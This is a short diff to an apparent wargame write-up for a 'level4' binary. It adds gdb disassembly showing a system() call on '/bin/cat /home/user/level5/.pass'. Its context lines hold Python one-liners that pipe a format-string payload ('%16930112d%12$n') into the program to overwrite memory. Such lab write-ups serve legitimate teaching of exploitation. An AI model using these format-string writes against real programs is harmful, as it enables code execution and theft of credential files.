@@ -24,6 +24,15 @@ AAAA 41414141
 ```
 
 p 0x1025544 - 4 = 16930112
+
+```
+ 0x08048499 <+66>:	movl   $0x8048590,(%esp)
+ 0x080484a0 <+73>:	call   0x8048360 <system@plt>
+ 
+(gdb) x/s 0x8048590
+0x8048590:	 "/bin/cat /home/user/level5/.pass"
+```
+
 ```
 python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"' | ./level4 
 python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n" ' | ./level4
